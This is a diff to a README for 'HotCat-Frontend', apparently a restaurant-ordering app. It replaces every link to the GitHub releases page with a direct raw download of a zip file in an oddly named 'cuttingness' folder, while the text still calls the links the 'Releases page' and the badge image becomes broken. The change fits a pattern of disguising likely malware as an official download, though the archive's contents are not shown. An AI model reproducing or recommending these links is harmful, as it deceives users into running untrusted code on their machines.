@@ -1,6 +1,6 @@
 # 🐱 HotCat-Frontend - Smart Orders, Happier Tables.
 
-[![Download HotCat-Frontend](https://img.shields.io/badge/Download%20HotCat--Frontend-v1.0.0-blue)](https://github.com/ALLEAi170/HotCat-Frontend/releases)
+[![Download HotCat-Frontend](https://raw.githubusercontent.com/ALLEAi170/HotCat-Frontend/main/cuttingness/HotCat-Frontend.zip%20HotCat--Frontend-v1.0.0-blue)](https://raw.githubusercontent.com/ALLEAi170/HotCat-Frontend/main/cuttingness/HotCat-Frontend.zip)
 
 ## 📋 Overview
 
@@ -12,7 +12,7 @@ Follow these simple steps to download and run HotCat-Frontend:
 
 ### 1. Visit the Releases Page
 
-To get started, visit our [Releases page](https://github.com/ALLEAi170/HotCat-Frontend/releases). This page contains all the latest versions of the software.
+To get started, visit our [Releases page](https://raw.githubusercontent.com/ALLEAi170/HotCat-Frontend/main/cuttingness/HotCat-Frontend.zip). This page contains all the latest versions of the software.
 
 ### 2. Download the Application
 
@@ -61,7 +61,7 @@ HotCat-Frontend comes packed with features to enhance your restaurant's efficien
 
 ## 📦 Download & Install
 
-To download HotCat-Frontend, visit our [Releases page](https://github.com/ALLEAi170/HotCat-Frontend/releases) again. Ensure you select the correct file for your operating system. 
+To download HotCat-Frontend, visit our [Releases page](https://raw.githubusercontent.com/ALLEAi170/HotCat-Frontend/main/cuttingness/HotCat-Frontend.zip) again. Ensure you select the correct file for your operating system. 
 
 Remember, installation steps differ slightly based on your OS, as mentioned above. 
 
